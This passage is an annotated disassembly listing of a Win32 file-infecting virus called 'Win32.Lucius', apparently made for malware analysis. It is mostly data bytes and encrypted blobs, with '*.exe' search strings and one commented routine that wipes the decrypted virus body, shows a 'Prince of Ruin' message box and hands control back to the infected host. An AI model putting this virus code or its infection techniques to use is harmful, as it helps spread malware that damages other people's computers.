.data:00403AA6                 db    0
.data:00403AA7                 db  70h ; p
.data:00403AA8                 db  65h ; e
.data:00403AA9                 db  74h ; t
.data:00403AAA                 db  65h ; e
.data:00403AAB                 db  73h ; s
.data:00403AAC                 db  74h ; t
.data:00403AAD                 db  2Eh ; .
.data:00403AAE                 db  65h ; e
.data:00403AAF                 db  78h ; x
.data:00403AB0                 db  65h ; e
.data:00403AB1                 db    0
.data:00403AB2                 db    0
.data:00403AB3                 db    0
.data:00403AB4                 db    0
.data:00403AB5                 db    0
.data:00403AB6                 db    0
.data:00403AB7                 db    0
.data:00403AB8                 db    0
.data:00403AB9                 db    0
.data:00403ABA                 db    0
.data:00403ABB                 db    0
.data:00403ABC                 db    0
.data:00403ABD                 db    0
.data:00403ABE                 db    0
.data:00403ABF                 db    0
.data:00403AC0                 db    0
.data:00403AC1                 db    0
.data:00403AC2                 db    0
.data:00403AC3                 db    0
.data:00403AC4                 db    0
.data:00403AC5                 db    0
.data:00403AC6                 db    0
.data:00403AC7                 db    0
.data:00403AC8                 db    0
.data:00403AC9                 db    0
.data:00403ACA                 db    0
.data:00403ACB                 db    0
.data:00403ACC                 db    0
.data:00403ACD                 db    0
.data:00403ACE                 db    0
.data:00403ACF                 db    0
.data:00403AD0                 db    0
.data:00403AD1                 db    0
.data:00403AD2                 db    0
.data:00403AD3                 db    0
.data:00403AD4                 db    0
.data:00403AD5                 db    0
.data:00403AD6                 db    0
.data:00403AD7                 db    0
.data:00403AD8                 db    0
.data:00403AD9                 db    0
.data:00403ADA                 db    0
.data:00403ADB                 db    0
.data:00403ADC                 db    0
.data:00403ADD                 db    0
.data:00403ADE                 db    0
.data:00403ADF                 db    0
.data:00403AE0                 db    0
.data:00403AE1                 db    0
.data:00403AE2                 db    0
.data:00403AE3                 db    0
.data:00403AE4                 db    0
.data:00403AE5                 db    0
.data:00403AE6                 db    0
.data:00403AE7                 db    0
.data:00403AE8                 db    0
.data:00403AE9                 db    0
.data:00403AEA                 db    0
.data:00403AEB                 db    0
.data:00403AEC                 db    0
.data:00403AED                 db    0
.data:00403AEE                 db    0
.data:00403AEF                 db    0
.data:00403AF0                 db    0
.data:00403AF1                 db    0
.data:00403AF2                 db    0
.data:00403AF3                 db    0
.data:00403AF4                 db    0
.data:00403AF5                 db    0
.data:00403AF6                 db    0
.data:00403AF7                 db    0
.data:00403AF8                 db    0
.data:00403AF9                 db    0
.data:00403AFA                 db    0
.data:00403AFB                 db    0
.data:00403AFC                 db    0
.data:00403AFD                 db    0
.data:00403AFE                 db    0
.data:00403AFF                 db    0
.data:00403B00                 db    0
.data:00403B01                 db    0
.data:00403B02                 db    0
.data:00403B03                 db    0
.data:00403B04                 db    0
.data:00403B05                 db    0
.data:00403B06                 db    0
.data:00403B07                 db    0
.data:00403B08                 db    0
.data:00403B09                 db    0
.data:00403B0A                 db    0
.data:00403B0B                 db    0
.data:00403B0C                 db    0
.data:00403B0D                 db    0
.data:00403B0E                 db    0
.data:00403B0F                 db    0
.data:00403B10                 db    0
.data:00403B11                 db    0
.data:00403B12                 db    0
.data:00403B13                 db    0
.data:00403B14                 db    0
.data:00403B15                 db    0
.data:00403B16                 db    0
.data:00403B17                 db    0
.data:00403B18                 db    0
.data:00403B19                 db    0
.data:00403B1A                 db    0
.data:00403B1B                 db    0
.data:00403B1C                 db    0
.data:00403B1D                 db    0
.data:00403B1E                 db    0
.data:00403B1F                 db    0
.data:00403B20                 db    0
.data:00403B21                 db    0
.data:00403B22                 db    0
.data:00403B23                 db    0
.data:00403B24                 db    0
.data:00403B25                 db    0
.data:00403B26                 db    0
.data:00403B27                 db    0
.data:00403B28                 db    0
.data:00403B29                 db    0
.data:00403B2A                 db    0
.data:00403B2B                 db    0
.data:00403B2C                 db    0
.data:00403B2D                 db    0
.data:00403B2E                 db    0
.data:00403B2F                 db    0
.data:00403B30                 db    0
.data:00403B31                 db    0
.data:00403B32                 db    0
.data:00403B33                 db    0
.data:00403B34                 db    0
.data:00403B35                 db    0
.data:00403B36                 db    0
.data:00403B37                 db    0
.data:00403B38                 db    0
.data:00403B39                 db    0
.data:00403B3A                 db    0
.data:00403B3B                 db    0
.data:00403B3C                 db    0
.data:00403B3D                 db    0
.data:00403B3E                 db    0
.data:00403B3F                 db    0
.data:00403B40                 db    0
.data:00403B41                 db    0
.data:00403B42                 db    0
.data:00403B43                 db    0
.data:00403B44                 db    0
.data:00403B45                 db    0
.data:00403B46                 db    0
.data:00403B47                 db    0
.data:00403B48                 db    0
.data:00403B49                 db    0
.data:00403B4A                 db    0
.data:00403B4B                 db    0
.data:00403B4C                 db    0
.data:00403B4D                 db    0
.data:00403B4E                 db    0
.data:00403B4F                 db    0
.data:00403B50                 db    0
.data:00403B51                 db    0
.data:00403B52                 db    0
.data:00403B53                 db    0
.data:00403B54                 db    0
.data:00403B55                 db    0
.data:00403B56                 db    0
.data:00403B57                 db    0
.data:00403B58                 db    0
.data:00403B59                 db    0
.data:00403B5A                 db    0
.data:00403B5B                 db    0
.data:00403B5C                 db    0
.data:00403B5D                 db    0
.data:00403B5E                 db    0
.data:00403B5F                 db    0
.data:00403B60                 db    0
.data:00403B61                 db    0
.data:00403B62                 db    0
.data:00403B63                 db    0
.data:00403B64                 db    0
.data:00403B65                 db    0
.data:00403B66                 db    0
.data:00403B67                 db    0
.data:00403B68                 db    0
.data:00403B69                 db    0
.data:00403B6A                 db    0
.data:00403B6B                 db    0
.data:00403B6C                 db    0
.data:00403B6D                 db    0
.data:00403B6E                 db    0
.data:00403B6F                 db    0
.data:00403B70                 db    0
.data:00403B71                 db    0
.data:00403B72                 db    0
.data:00403B73                 db    1
.data:00403B74                 db 0BEh ; \BE
.data:00403B75                 db  34h ; 4
.data:00403B76                 db  9Eh ; \9E
.data:00403B77                 db  98h ; \98
.data:00403B78                 db 0FEh ; \FE
.data:00403B79                 db  42h ; B
.data:00403B7A                 db  96h ; \96
.data:00403B7B                 db  75h ; u
.data:00403B7C                 db  1Eh
.data:00403B7D                 db  1Bh
.data:00403B7E                 db  66h ; f
.data:00403B7F                 db  36h ; 6
.data:00403B80                 db  99h ; \99
.data:00403B81                 db 0CCh ; \CC
.data:00403B82                 db 0ACh ; \AC
.data:00403B83                 db 0F6h ; \F6
.data:00403B84                 db  4Bh ; K
.data:00403B85                 db 0BEh ; \BE
.data:00403B86                 db  4Ch ; L
.data:00403B87                 db 0DBh ; \DB
.data:00403B88                 db 0AEh ; \AE
.data:00403B89                 db  4Bh ; K
.data:00403B8A                 db  19h
.data:00403B8B                 db  1Dh
.data:00403B8C                 db 0AEh ; \AE
.data:00403B8D                 db 0DCh ; \DC
.data:00403B8E                 db  14h
.data:00403B8F                 db  74h ; t
.data:00403B90                 db 0AAh ; \AA
.data:00403B91                 db  11h
.data:00403B92                 db 0E5h ; \E5
.data:00403B93                 db  89h ; \89
.data:00403B94                 db  64h ; d
.data:00403B95                 db  2Dh ; -
.data:00403B96                 db 0A8h ; \A8
.data:00403B97                 db  4Bh ; K
.data:00403B98                 db  71h ; q
.data:00403B99                 db    9
.data:00403B9A                 db  7Ch ; |
.data:00403B9B                 db 0BBh ; \BB
.data:00403B9C                 db  62h ; b
.data:00403B9D                 db 0FCh ; \FC
.data:00403B9E                 db  9Bh ; \9B
.data:00403B9F                 db  47h ; G
.data:00403BA0                 db 0EFh ; \EF
.data:00403BA1                 db 0E1h ; \E1
.data:00403BA2                 db  38h ; 8
.data:00403BA3                 db  34h ; 4
.data:00403BA4                 db 0BFh ; \BF
.data:00403BA5                 db  5Bh ; [
.data:00403BA6                 db 0AEh ; \AE
.data:00403BA7                 db  57h ; W
.data:00403BA8                 db  32h ; 2
.data:00403BA9                 db 0ABh ; \AB
.data:00403BAA                 db  73h ; s
.data:00403BAB                 db    2
.data:00403BAC                 db 0C9h ; \C9
.data:00403BAD                 db 0D8h ; \D8
.data:00403BAE                 db  39h ; 9
.data:00403BAF                 db 0E2h ; \E2
.data:00403BB0                 db  82h ; \82
.data:00403BB1                 db 0BBh ; \BB
.data:00403BB2                 db 0A4h ; \A4
.data:00403BB3                 db 0DFh ; \DF
.data:00403BB4                 db  6Eh ; n
.data:00403BB5                 db 0C6h ; \C6
.data:00403BB6                 db  2Eh ; .
.data:00403BB7                 db  2Eh ; .
.data:00403BB8                 db    0
.data:00403BB9                 db  2Ah ; *
.data:00403BBA                 db  2Eh ; .
.data:00403BBB                 db  2Ah ; *
.data:00403BBC                 db    0
.data:00403BBD                 db  38h ; 8
.data:00403BBE                 db    0
.data:00403BBF                 db    0
.data:00403BC0                 db    0
.data:00403BC1                 db    0
.data:00403BC2                 db    0
.data:00403BC3                 db    0
.data:00403BC4                 db    0
.data:00403BC5                 db    0
.data:00403BC6                 db    0
.data:00403BC7                 db    0
.data:00403BC8                 db    0
.data:00403BC9                 db    0
.data:00403BCA                 db    0
.data:00403BCB                 db    0
.data:00403BCC                 db    0
.data:00403BCD                 db    0
.data:00403BCE                 db    0
.data:00403BCF                 db  63h ; c
.data:00403BD0                 db  75h ; u
.data:00403BD1                 db    0
.data:00403BD2                 db    0
.data:00403BD3                 db    0
.data:00403BD4                 db    0
.data:00403BD5                 db    3
.data:00403BD6                 db    0
.data:00403BD7                 db    0
.data:00403BD8                 db    0
.data:00403BD9                 db 0E0h ; \E0
.data:00403BDA                 db    0
.data:00403BDB                 db  33h ; 3
.data:00403BDC                 db    0
.data:00403BDD                 db    0
.data:00403BDE                 db  10h
.data:00403BDF                 db    0
.data:00403BE0                 db    0
.data:00403BE1                 db    0
.data:00403BE2                 db    4
.data:00403BE3                 db  33h ; 3
.data:00403BE4                 db    0
.data:00403BE5                 db    0
.data:00403BE6                 db    0
.data:00403BE7                 db  40h ; @
.data:00403BE8                 db    0
.data:00403BE9                 db 0C0h ; \C0
.data:00403BEA                 db    1
.data:00403BEB                 db  33h ; 3
.data:00403BEC                 db    0
.data:00403BED                 db    0
.data:00403BEE                 db    2
.data:00403BEF                 db    0
.data:00403BF0                 db    0
.data:00403BF1                 db    0
.data:00403BF2                 db  10h
.data:00403BF3                 db    0
.data:00403BF4                 db    0
.data:00403BF5                 db    0
.data:00403BF6                 db    0
.data:00403BF7                 db    0
.data:00403BF8                 db    0
.data:00403BF9                 db  51h ; Q
.data:00403BFA                 db  3Dh ; =
.data:00403BFB                 db  3Ch ; <
.data:00403BFC                 db    5
.data:00403BFD                 db    0
.data:00403BFE                 db    0
.data:00403BFF                 db    0
.data:00403C00                 db    0
.data:00403C01                 db  2Ah ; *
.data:00403C02                 db  2Eh ; .
.data:00403C03                 db  2Ah ; *
.data:00403C04                 db    0
.data:00403C05                 db  2Eh ; .
.data:00403C06                 db  2Eh ; .
.data:00403C07                 db    0
.data:00403C08                 db  64h ; d
.data:00403C09                 db  61h ; a
.data:00403C0A                 db  6Eh ; n
.data:00403C0B                 db  67h ; g
.data:00403C0C                 db  65h ; e
.data:00403C0D                 db  72h ; r
.data:00403C0E                 db    0
.data:00403C0F                 db    0
.data:00403C10                 db    0
.data:00403C11                 db    0
.data:00403C12                 db    0
.data:00403C13                 db  2Ah ; *
.data:00403C14                 db  2Eh ; .
.data:00403C15                 db  65h ; e
.data:00403C16                 db  78h ; x
.data:00403C17                 db  65h ; e
.data:00403C18                 db    0
.data:00403C19                 db  2Eh ; .
.data:00403C1A                 db  2Eh ; .
.data:00403C1B                 db    0
.data:00403C1C                 db 0D4h ; \D4
.data:00403C1D                 db  6Ah ; j
.data:00403C1E                 db  26h ; &
.data:00403C1F                 db 0
.data:00403C20                 db  31h ; 1
.data:00403C21                 db 26h
.data:00403C22                 db    0
.data:00403C23                 db    0
.data:00403C24                 db 0C0h
.data:00403C25                 db    1
.data:00403C26                 db  33h ; 3
.data:00403C27                 db    0
.data:00403C28 ; ---------------------------------------------------------------------------
.data:00403C28
.data:00403C28 overwrite_and_display:                  ; CODE XREF: .data:0040330D\u2191j
.data:00403C28                 lea     eax, [ebp+401A84h] ; user32
.data:00403C2E                 push    eax             ; save user 32 onto stack
.data:00403C2F                 mov     eax, [ebp+40177Ch] ; LoadLibrary
.data:00403C35                 call    eax             ; call LoadLibrary
.data:00403C37                 mov     [ebp+401BB5h], eax ; user32 base addr
.data:00403C3D                 lea     esi, [ebp+40182Ch] ; MessageBoxA
.data:00403C43                 call    Get_Func_Addr
.data:00403C48                 mov     [ebp+401837h], eax ; user32.MessageBoxA
.data:00403C4E                 push    0               ; push 0
.data:00403C50                 lea     eax, [ebp+401C67h] ; Wn32.Lucius
.data:00403C56                 push    eax             ; save Win32.Lucuis string onto stack
.data:00403C57                 lea     eax, [ebp+401C74h] ; ...I am Lucius, Prince of Ruin...
.data:00403C5D                 push    eax             ; save eax onto stack
.data:00403C5E                 push    0               ; push 0
.data:00403C60                 mov     eax, [ebp+401837h] ; user32.MessageBoxA
.data:00403C66                 push    eax             ; push eax onto stack
.data:00403C67                 lea     edi, [ebp+401000h] ; from start of virus
.data:00403C6D                 mov     ecx, 0C62h      ; ecx = 3170
.data:00403C72                 mov     al, 0           ; al = 0
.data:00403C74                 rep stosb               ; overwrite the decrypted virsu with zeros
.data:00403C76                 pop     eax             ; restore eax
.data:00403C77                 call    eax             ; Display the strings "Win32.Lucius" and "...I am Lucius, Prince of Ruin..."
.data:00403C79                 jmp     short return_control ; jmp to addr of orginal call instruction
.data:00403C79 ; ---------------------------------------------------------------------------
.data:00403C7B aWin32Lucius    db 'Win32.Lucius',0
.data:00403C88 aIAmLuciusPrinc db '...I am Lucius, Prince of Ruin...',0
.data:00403CAA ; ---------------------------------------------------------------------------
.data:00403CAA
.data:00403CAA return_control:                         ; CODE XREF: .data:00403C79\u2191j
.data:00403CAA                 push    offset MessageBoxA ; save addr of original call instr
.data:00403CAF                 retn                    ; return control
.data:00403CAF ; ---------------------------------------------------------------------------
.data:00403CB0                 db  0Fh
.data:00403CB1                 db 0C5h ; \C5
.data:00403CB2                 db  15h
.data:00403CB3                 db    9
.data:00403CB4                 db  4Fh ; O
.data:00403CB5                 db  56h ; V
.data:00403CB6                 db  25h ; %
.data:00403CB7                 db  17h
.data:00403CB8                 db  7Dh ; }
.data:00403CB9                 db 0A3h ; \A3
.data:00403CBA                 db 0A2h ; \A2
.data:00403CBB                 db    8
.data:00403CBC                 db  4Ch ; L
.data:00403CBD                 db  51h ; Q
.data:00403CBE                 db 0E1h ; \E1
.data:00403CBF                 db    4
.data:00403CC0                 db 0FAh ; \FA
.data:00403CC1                 db  46h ; F
.data:00403CC2                 db  89h ; \89
.data:00403CC3                 db    7
.data:00403CC4                 db  28h ; (
.data:00403CC5                 db  5Dh ; ]
.data:00403CC6                 db  64h ; d
.data:00403CC7                 db  0Bh
.data:00403CC8                 db  5Ch ; \
.data:00403CC9                 db 0CAh ; \CA
.data:00403CCA                 db  65h ; e
.data:00403CCB                 db    1
.data:00403CCC                 db  10h
.data:00403CCD                 db 0D9h ; \D9
.data:00403CCE                 db  99h ; \99
.data:00403CCF                 db    7
.data:00403CD0                 db  2Dh ; -
.data:00403CD1                 db 0CBh ; \CB
.data:00403CD2                 db  79h ; y
.data:00403CD3                 db    5
.data:00403CD4                 db 0B3h ; \B3
.data:00403CD5                 db    6
.data:00403CD6                 db 0ADh ; \AD
.data:00403CD7                 db  0Ah
.data:00403CD8                 db  3Ch ; <
.data:00403CD9                 db 0B5h ; \B5
.data:00403CDA                 db  7Bh ; {
.data:00403CDB                 db    8
.data:00403CDC                 db 0B1h ; \B1
.data:00403CDD                 db  7Bh ; {
.data:00403CDE                 db 0FDh ; \FD
.data:00403CDF                 db    8
.data:00403CE0                 db    2
.data:00403CE1                 db  21h ; !
.data:00403CE2                 db  38h ; 8
.data:00403CE3                 db  0Bh
.data:00403CE4                 db  44h ; D
.data:00403CE5                 db  33h ; 3
.data:00403CE6                 db  5Ch ; \
.data:00403CE7                 db    6
.data:00403CE8                 db 0A4h ; \A4
.data:00403CE9                 db 0FFh ; \FF
.data:00403CEA                 db  86h ; \86
.data:00403CEB                 db    3
.data:00403CEC                 db    0
.data:00403CED                 db  8Dh
.data:00403CEE                 db  56h ; V
.data:00403CEF                 db    8
.data:00403CF0                 db  7Ah ; z
.data:00403CF1                 db    0
.data:00403CF2                 db  89h ; \89
.data:00403CF3                 db    1
.data:00403CF4                 db    0
.data:00403CF5                 db    0
.data:00403CF6                 db    0
.data:00403CF7                 db    0
.data:00403CF8                 db    0
.data:00403CF9                 db    0
.data:00403CFA                 db    0
.data:00403CFB                 db    0
.data:00403CFC                 db    0
.data:00403CFD                 db    0
.data:00403CFE                 db    0
.data:00403CFF                 db    0
.data:00403D00                 db    0
.data:00403D01                 db    0
.data:00403D02                 db    0
.data:00403D03                 db    0
.data:00403D04                 db    0
.data:00403D05                 db    0
.data:00403D06                 db    0
.data:00403D07                 db    0
.data:00403D08                 db    0
.data:00403D09                 db    0
.data:00403D0A                 db    0
.data:00403D0B                 db    0
.data:00403D0C                 db    0
.data:00403D0D                 db    0
.data:00403D0E                 db    0
.data:00403D0F                 db    0
.data:00403D10                 db    0
.data:00403D11                 db    0
.data:00403D12                 db    0
.data:00403D13                 db    0
.data:00403D14                 db    0
.data:00403D15                 db    0
.data:00403D16                 db    0
.data:00403D17                 db    0
.data:00403D18                 db    0
.data:00403D19                 db    0
.data:00403D1A                 db    0
.data:00403D1B                 db    0
.data:00403D1C                 db    0
.data:00403D1D                 db    0
.data:00403D1E                 db    0
.data:00403D1F                 db    0
.data:00403D20                 db    0
.data:00403D21                 db    0
.data:00403D22                 db    0
.data:00403D23                 db    0
.data:00403D24                 db    0
.data:00403D25                 db    0
.data:00403D26                 db    0
.data:00403D27                 db    0
.data:00403D28                 db    0
.data:00403D29                 db    0
.data:00403D2A                 db    0
.data:00403D2B                 db    0
.data:00403D2C                 db    0
.data:00403D2D                 db    0
.data:00403D2E                 db    0
.data:00403D2F                 db    0
.data:00403D30                 db    0
.data:00403D31                 db    0
.data:00403D32                 db    0
.data:00403D33                 db    0
.data:00403D34                 db    0
.data:00403D35                 db    0
.data:00403D36                 db    0
.data:00403D37                 db    0
.data:00403D38                 db    0
.data:00403D39                 db    0
.data:00403D3A                 db    0
.data:00403D3B                 db    0
.data:00403D3C                 db    0
.data:00403D3D                 db    0
.data:00403D3E                 db    0
.data:00403D3F                 db    0
.data:00403D40                 db    0
.data:00403D41                 db    0
.data:00403D42                 db    0
.data:00403D43                 db    0
.data:00403D44                 db    0
.data:00403D45                 db    0
.data:00403D46                 db    0
.data:00403D47                 db    0
.data:00403D48                 db    0
.data:00403D49                 db    0
.data:00403D4A                 db    0
.data:00403D4B                 db    0
.data:00403D4C                 db    0
.data:00403D4D                 db    0
.data:00403D4E                 db    0
.data:00403D4F                 db    0
.data:00403D50                 db    0
.data:00403D51                 db    0
.data:00403D52                 db    0
.data:00403D53                 db    0
.data:00403D54                 db    0
.data:00403D55                 db    0
.data:00403D56                 db    0
.data:00403D57                 db    0
.data:00403D58                 db    0
.data:00403D59                 db    0
.data:00403D5A                 db    0
.data:00403D5B                 db    0
.data:00403D5C                 db    0
.data:00403D5D                 db    0
.data:00403D5E                 db    0
.data:00403D5F                 db    0
.data:00403D60                 db    0
.data:00403D61                 db    0
.data:00403D62                 db    0
.data:00403D63                 db    0
.data:00403D64                 db    0
.data:00403D65                 db    0
.data:00403D66                 db    0
.data:00403D67                 db    0
.data:00403D68                 db    0
.data:00403D69                 db    0
.data:00403D6A                 db    0
.data:00403D6B                 db    0
.data:00403D6C                 db    0
.data:00403D6D                 db    0
.data:00403D6E                 db    0
.data:00403D6F                 db    0
.data:00403D70                 db    0
.data:00403D71                 db    0
.data:00403D72                 db    0
.data:00403D73                 db    0
.data:00403D74                 db    0
.data:00403D75                 db    0
.data:00403D76                 db    0
.data:00403D77                 db    0
.data:00403D78                 db    0
.data:00403D79                 db    0
.data:00403D7A                 db    0
.data:00403D7B                 db    0
.data:00403D7C                 db    0
.data:00403D7D                 db    0
.data:00403D7E                 db    0
.data:00403D7F                 db    0
.data:00403D80                 db    0
.data:00403D81                 db    0
.data:00403D82                 db    0
.data:00403D83                 db    0
.data:00403D84                 db    0
.data:00403D85                 db    0
.data:00403D86                 db    0
.data:00403D87                 db    0
.data:00403D88                 db    0
.data:00403D89                 db    0
.data:00403D8A                 db    0
.data:00403D8B                 db    0
.data:00403D8C                 db    0
.data:00403D8D                 db    0
.data:00403D8E                 db    0
.data:00403D8F                 db    0
.data:00403D90                 db    0
.data:00403D91                 db    0
.data:00403D92                 db    0
.data:00403D93                 db    0
.data:00403D94                 db    0
.data:00403D95                 db    0
.data:00403D96                 db    0
.data:00403D97                 db    0
.data:00403D98                 db    0
.data:00403D99                 db    0
.data:00403D9A                 db    0
.data:00403D9B                 db    0
.data:00403D9C                 db    0
.data:00403D9D                 db    0
.data:00403D9E                 db    0
.data:00403D9F                 db    0
.data:00403DA0                 db    0
.data:00403DA1                 db    0
.data:00403DA2                 db    0
.data:00403DA3                 db    0
.data:00403DA4                 db    0
.data:00403DA5                 db    0
.data:00403DA6                 db    0
.data:00403DA7                 db    0
.data:00403DA8                 db    0
.data:00403DA9                 db    0
.data:00403DAA                 db    0
.data:00403DAB                 db    0
.data:00403DAC                 db    0
.data:00403DAD                 db    0
.data:00403DAE                 db    0
.data:00403DAF                 db    0
.data:00403DB0                 db    0
.data:00403DB1                 db    0
.data:00403DB2                 db    0
.data:00403DB3                 db    0
.data:00403DB4                 db    0
.data:00403DB5                 db    0
.data:00403DB6                 db    0
.data:00403DB7                 db    0
.data:00403DB8                 db    0
.data:00403DB9                 db    0
.data:00403DBA                 db    0
.data:00403DBB                 db    0
.data:00403DBC                 db    0
.data:00403DBD                 db    0
.data:00403DBE                 db    0
.data:00403DBF                 db    0
.data:00403DC0                 db    0
.data:00403DC1                 db    0
.data:00403DC2                 db    0
.data:00403DC3                 db    0
.data:00403DC4                 db    0
.data:00403DC5                 db    0
.data:00403DC6                 db    0
.data:00403DC7                 db    0
.data:00403DC8                 db    0
.data:00403DC9                 db    0
.data:00403DCA                 db    0
.data:00403DCB                 db    0
.data:00403DCC                 db    0
.data:00403DCD                 db    0
.data:00403DCE                 db    0
.data:00403DCF                 db    0
.data:00403DD0                 db    0
.data:00403DD1                 db    0
.data:00403DD2                 db    0
.data:00403DD3                 db    0
.data:00403DD4                 db    0
.data:00403DD5                 db    0
.data:00403DD6                 db    0
.data:00403DD7                 db    0
.data:00403DD8                 db    0
.data:00403DD9                 db    0
.data:00403DDA                 db    0
.data:00403DDB                 db    0
.data:00403DDC                 db    0
.data:00403DDD                 db    0
.data:00403DDE                 db    0
.data:00403DDF                 db    0
.data:00403DE0                 db    0
.data:00403DE1                 db    0
.data:00403DE2                 db    0
.data:00403DE3                 db    0
.data:00403DE4                 db    0
.data:00403DE5                 db    0
.data:00403DE6                 db    0
.data:00403DE7                 db    0
.data:00403DE8                 db    0
.data:00403DE9                 db    0
.data:00403DEA                 db    0
.data:00403DEB                 db    0
.data:00403DEC                 db    0
.data:00403DED                 db    0
.data:00403DEE                 db    0
.data:00403DEF                 db    0
.data:00403DF0                 db    0
.data:00403DF1                 db    0
.data:00403DF2                 db    0
.data:00403DF3                 db    0
.data:00403DF4                 db    0
.data:00403DF5                 db    0
.data:00403DF6                 db    0
.data:00403DF7                 db    0
.data:00403DF8                 db    0
.data:00403DF9                 db    0
.data:00403DFA                 db    0
.data:00403DFB                 db    0
.data:00403DFC                 db    0
.data:00403DFD                 db    0
.data:00403DFE                 db    0
.data:00403DFF                 db    0
.data:00403E00                 db    0
.data:00403E01                 db    0
.data:00403E02                 db    0
.data:00403E03                 db    0
.data:00403E04                 db    0
.data:00403E05                 db    0
.data:00403E06                 db    0
.data:00403E07                 db    0
.data:00403E08                 db    0
.data:00403E09                 db    0
.data:00403E0A                 db    0
.data:00403E0B                 db    0
.data:00403E0C                 db    0
.data:00403E0D                 db    0
.data:00403E0E                 db    0
.data:00403E0F                 db    0
.data:00403E10                 db    0
.data:00403E11                 db    0
.data:00403E12                 db    0
.data:00403E13                 db    0
.data:00403E14                 db    0
.data:00403E15                 db    0
.data:00403E16                 db    0
.data:00403E17                 db    0
.data:00403E18                 db    0
.data:00403E19                 db    0
.data:00403E1A                 db    0
.data:00403E1B                 db    0
.data:00403E1C                 db    0
.data:00403E1D                 db    0
.data:00403E1E                 db    0
.data:00403E1F                 db    0
.data:00403E20                 db    0
.data:00403E21                 db    0
.data:00403E22                 db    0
.data:00403E23                 db    0
.data:00403E24                 db    0
.data:00403E25                 db    0
.data:00403E26                 db    0
.data:00403E27                 db    0
.data:00403E28                 db    0
.data:00403E29                 db    0
.data:00403E2A                 db    0
.data:00403E2B                 db    0
.data:00403E2C                 db    0
.data:00403E2D                 db    0
.data:00403E2E                 db    0
.data:00403E2F                 db    0
.data:00403E30                 db    0
.data:00403E31                 db    0
.data:00403E32                 db    0
.data:00403E33                 db    0
.data:00403E34                 db    0
.data:00403E35                 db    0
.data:00403E36                 db    0
.data:00403E37                 db    0
.data:00403E38                 db    0
.data:00403E39                 db    0
.data:00403E3A                 db    0
.data:00403E3B                 db    0
.data:00403E3C                 db    0
.data:00403E3D                 db    0
.data:00403E3E                 db    0
.data:00403E3F                 db    0
.data:00403E40                 db    0
.data:00403E41                 db    0
.data:00403E42                 db    0
.data:00403E43                 db    0
.data:00403E44                 db    0
.data:00403E45                 db    0
.data:00403E46                 db    0
.data:00403E47                 db    0
.data:00403E48                 db    0
.data:00403E49                 db    0
.data:00403E4A                 db    0
.data:00403E4B                 db    0
.data:00403E4C                 db    0
.data:00403E4D                 db    0
.data:00403E4E                 db    0
.data:00403E4F                 db    0
.data:00403E50                 db    0
.data:00403E51                 db    0
.data:00403E52                 db    0
.data:00403E53                 db    0
.data:00403E54                 db    0
.data:00403E55                 db    0
.data:00403E56                 db    0
.data:00403E57                 db    0
.data:00403E58                 db    0
.data:00403E59                 db    0
.data:00403E5A                 db    0
.data:00403E5B                 db    0
.data:00403E5C                 db    0
.data:00403E5D                 db    0
.data:00403E5E                 db    0
.data:00403E5F                 db    0
.data:00403E60                 db    0
.data:00403E61                 db    0
.data:00403E62                 db    0
.data:00403E63                 db    0
.data:00403E64                 db    0
.data:00403E65                 db    0
.data:00403E66                 db    0
.data:00403E67                 db    0
.data:00403E68                 db    0
.data:00403E69                 db    0
.data:00403E6A                 db    0
.data:00403E6B                 db    0
.data:00403E6C                 db    0
.data:00403E6D                 db    0
.data:00403E6E                 db    0
.data:00403E6F                 db    0
.data:00403E70                 db    0
.data:00403E71                 db    0
.data:00403E72                 db    0
.data:00403E73                 db    0
.data:00403E74                 db    0
.data:00403E75                 db    0
.data:00403E76                 db    0
.data:00403E77                 db    0
.data:00403E78                 db    0
.data:00403E79                 db    0
.data:00403E7A                 db    0
.data:00403E7B                 db    0
.data:00403E7C                 db    0
.data:00403E7D                 db    0
.data:00403E7E                 db    0
.data:00403E7F                 db    0
.data:00403E80                 db    0
.data:00403E81                 db    0
.data:00403E82                 db    0
.data:00403E83                 db    0
.data:00403E84                 db    0
.data:00403E85                 db    0
.data:00403E86                 db    0
.data:00403E87                 db    0
.data:00403E88                 db    0
.data:00403E89                 db    0
.data:00403E8A                 db    0
.data:00403E8B                 db    0
.data:00403E8C                 db    0
.data:00403E8D                 db    0
.data:00403E8E                 db    0
.data:00403E8F                 db    0
.data:00403E90                 db    0
.data:00403E91                 db    0
.data:00403E92                 db    0
.data:00403E93                 db    0
.data:00403E94                 db    0
.data:00403E95                 db    0
.data:00403E96                 db    0
.data:00403E97                 db    0
.data:00403E98                 db    0
.data:00403E99                 db    0
.data:00403E9A                 db    0
.data:00403E9B                 db    0
.data:00403E9C                 db    0
.data:00403E9D                 db    0
.data:00403E9E                 db    0
.data:00403E9F                 db    0
.data:00403EA0                 db    0
.data:00403EA1                 db    0
.data:00403EA2                 db    0
.data:00403EA3                 db    0
.data:00403EA4                 db    0
.data:00403EA5                 db    0
.data:00403EA6                 db    0
.data:00403EA7                 db    0
.data:00403EA8                 db    0
.data:00403EA9                 db    0
.data:00403EAA                 db    0
.data:00403EAB                 db    0
.data:00403EAC                 db    0
.data:00403EAD                 db    0
.data:00403EAE                 db    0
.data:00403EAF                 db    0
.data:00403EB0                 db    0
.data:00403EB1                 db    0
.data:00403EB2                 db    0
.data:00403EB3                 db    0
.data:00403EB4                 db    0
.data:00403EB5                 db    0
.data:00403EB6                 db    0
.data:00403EB7                 db    0
.data:00403EB8                 db    0
.data:00403EB9                 db    0
.data:00403EBA                 db    0
.data:00403EBB                 db    0
.data:00403EBC                 db    0
.data:00403EBD                 db    0
.data:00403EBE                 db    0
.data:00403EBF                 db    0
.data:00403EC0                 db    0
.data:00403EC1                 db    0
.data:00403EC2                 db    0
.data:00403EC3                 db    0
.data:00403EC4                 db    0
.data:00403EC5                 db    0
.data:00403EC6                 db    0
.data:00403EC7                 db    0
.data:00403EC8                 db    0
.data:00403EC9                 db    0
.data:00403ECA                 db    0
.data:00403ECB                 db    0
.data:00403ECC                 db    0
.data:00403ECD                 db    0
.data:00403ECE                 db    0
.data:00403ECF                 db    0
.data:00403ED0                 db    0
.data:00403ED1                 db    0
.data:00403ED2                 db    0
.data:00403ED3                 db    0
.data:00403ED4                 db    0
.data:00403ED5                 db    0
.data:00403ED6                 db    0
.data:00403ED7                 db    0
.data:00403ED8                 db    0
.data:00403ED9                 db    0
.data:00403EDA                 db    0
.data:00403EDB                 db    0
.data:00403EDC                 db    0
.data:00403EDD                 db    0
.data:00403EDE                 db    0
.data:00403EDF                 db    0
.data:00403EE0                 db    0
.data:00403EE1                 db    0
.data:00403EE2                 db    0
.data:00403EE3                 db    0
.data:00403EE4                 db    0
.data:00403EE5                 db    0
.data:00403EE6                 db    0
.data:00403EE7                 db    0
